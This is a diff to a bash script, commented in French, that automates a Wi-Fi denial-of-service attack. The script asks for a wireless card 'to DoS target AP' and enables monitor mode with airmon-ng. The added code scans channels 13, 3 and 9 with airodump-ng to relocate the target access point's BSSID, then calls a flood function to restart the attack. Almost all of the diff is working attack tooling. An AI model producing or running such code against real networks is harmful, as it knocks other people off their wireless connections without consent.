@@ -2,13 +2,12 @@
 echo $$ >/tmp/terminal.pid
 
 
-
 ################################################################
 
 f_floodinterface(){    # fonction qui demande les infos a l'utilisateur
 ifconfig -a
 unset int
-while [ -z "${int}" ]; do read -p "Name of your second wireless card use to DoS target AP: " int; done
+while [ -z "${int}" ]; do read -p "Name of your second wireless card use to DoS target AP(enter wlan5 if you use hostapd multi AP): " int; done
        if echo ${int} | egrep '^wlan*|wlp*|wlx*'  ; then
 echo -e "\e[1;34m[*]\e[0m Starting monitor mode."
 airmon-ng start ${int}
@@ -39,8 +38,8 @@ fi
 
 
 unset seconde
-while [ -z "$seconde" ]; do read -p "Time before check AP channel (MUST BE MORE LONGER THAN 60): " seconde; done
-if (($seconde >= 60 && $seconde <= 259200)); then
+while [ -z "$seconde" ]; do read -p "Time before check AP channel (MUST BE MORE LONGER THAN 90): " seconde; done
+if (($seconde >= 90 && $seconde <= 259200)); then
 echo -e "\e[1;34m[*]\e[0m OK."
         else
 	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid time !\n"
@@ -135,6 +134,57 @@ sleep 1;
 kill `cat /tmp/airodump.pid`
 rm -rf track*
 fi
+
+canal=13
+xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track13 ${intmoniteur} &> /dev/null &
+echo $! >/tmp/airodump.pid
+sleep 7;
+if grep -q "${BSSID}" "track13-01.kismet.csv" ; then 
+   echo -e "\t\e[1;32m [+] AP channel find on channel 13, starting DoS it again"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+f_floodinstantane
+else
+    echo -e "\e[1;31m [!] AP is not on channel 13... searching it again...\e[0m"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+fi
+
+canal=3
+xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track3 ${intmoniteur} &> /dev/null &
+echo $! >/tmp/airodump.pid
+sleep 7;
+if grep -q "${BSSID}" "track3-01.kismet.csv" ; then 
+   echo -e "\t\e[1;32m [+] AP channel find on channel 3, starting DoS it again"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+f_floodinstantane
+else
+    echo -e "\e[1;31m [!] AP is not on channel 3... searching it again...\e[0m"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+fi
+
+canal=9
+xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track9 ${intmoniteur} &> /dev/null &
+echo $! >/tmp/airodump.pid
+sleep 7;
+if grep -q "${BSSID}" "track9-01.kismet.csv" ; then 
+   echo -e "\t\e[1;32m [+] AP channel find on channel 9, starting DoS it again"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+f_floodinstantane
+else
+    echo -e "\e[1;31m [!] AP is not on channel  1 3 6 9 11 and 13... --NO SUCESS-- take manual control to find it!\e[0m"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+fi
 }
 
 
@@ -175,7 +225,6 @@ else
 	clean=1
 	f_floodinterface
 fi
-
 
 
 
